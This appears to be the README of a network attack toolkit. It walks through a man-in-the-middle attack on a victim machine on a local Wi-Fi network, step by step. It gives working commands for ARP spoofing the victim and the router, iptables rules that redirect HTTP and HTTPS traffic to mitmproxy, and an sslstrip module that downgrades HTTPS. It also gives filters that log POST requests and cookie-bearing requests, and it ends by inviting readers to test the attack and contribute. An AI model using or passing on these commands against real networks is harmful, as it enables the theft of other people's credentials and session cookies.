MITM ATTACK WITH HTTP PROXYING ([MITMPROXY](http://docs.mitmproxy.org/en/stable/) v0.19)
----------
  
You can run  **mitm.sh**:  
```bash
Usage: ./mitm.sh [-i] [-n] [-s] ip_target1 ip_target2
       [-i] interactive mode for mitmproxy
       [-n] capture HTTP traffic
       [-s] capture HTTPS traffic
```  

**mitm.sh** is automating the following steps:  

 - activate ip forwarding (all secured connections will be routed without interception):  
```bash
sysctl -w net.ipv4.ip_forward=1
```

 - avoid to send useless ICMP redirect messages
```bash
echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
```

 - configure nat (8080 is the default listening port of mitmproxy):  
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```  
or if you want to add HTTPS capture:
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```  
*The REDIRECT target is used to redirect packets and streams to the machine itself. This means that we could for example REDIRECT all packets destined for the HTTP ports to an HTTP proxy (useful for transparent proxying).*  

 - run arp spoofing with calling the script **arpoison.sh**:  
```bash
xterm -geometry 100x25+1+200 -hold -e arpspoof -t [ip victim] [ip route]
xterm -geometry 100x25+1+300 -hold -e arpspoof -t [ip route] [ip victim]
```
*N.B: arpoison.sh can try to force the arp poisoning of some boxes*  

 - check if arp poisoning is working on both ways:  
```bash
python ./chk_poison.py [ip victim] [ip route]
```

 - run mitmproxy with our custom sslstrip.py module and io_write_dumpfile.py logging only relevant POST requests (if you want to log trafic, **-a \<logfilename\>**):  
```bash
mitmproxy -T --anticache --host --anticomp --noapp --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py --eventlog
```  
  
*N.B: mitmproxy (with option -w/-a for logging) will dump the whole flows in a tnetstrings format.*  
  
You can also run mitmdump (same as mitmproxy but non interactive):  
```bash
mitmdump -T --anticache --host --anticomp --noapp --quiet --script ./sslstrip.py -a requests.log "~m POST | (~m GET & ~hq Cookie)"
```
 
 - if you want to extra log urls in a file:   
```bash
urlsnarf > ./urlsnarf.txt &
```
  
**Now go on a website with an http landing webpage and try to click on a https link forwarding to a secure area. All trafic should stay clair between the victim and mitmproxy.**  
  
**Don't hesitate to contribute and to upgrade the sslstrip.py or chk_poison.py module.**
